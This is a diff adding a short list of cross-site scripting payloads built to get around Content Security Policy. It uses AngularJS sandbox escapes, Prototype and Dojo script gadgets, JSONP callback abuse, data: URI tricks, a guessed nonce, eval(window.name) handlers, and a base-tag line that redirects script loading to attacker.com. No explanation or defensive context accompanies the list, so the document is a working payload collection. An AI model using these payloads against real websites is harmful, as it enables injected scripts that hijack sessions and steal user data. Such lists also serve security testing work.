@@ -1,0 +1,14 @@
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><img src=x onerror="alert(1)">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/dojo/1.13.0/dojo.js"></script><img src=x onerror="require.rawConfig=alert,require(['anything'])">
+<script src="/api/jsonp?callback=alert(1)//"></script>
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+<base href="https://attacker.com/"><script src="/api/config.js"></script>
+<object data="data:text/html,<script>alert(1)</script>">
+<link rel="preload" href="data:text/html,<script>alert(1)</script>" as="fetch">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+<script nonce="GUESSED_NONCE">alert(1)</script>
+<script>alert(1)//# sourceURL=//attacker.com</script>
+<img src="x" onerror="eval(window.name)">
+<svg onload="eval(window.name)">
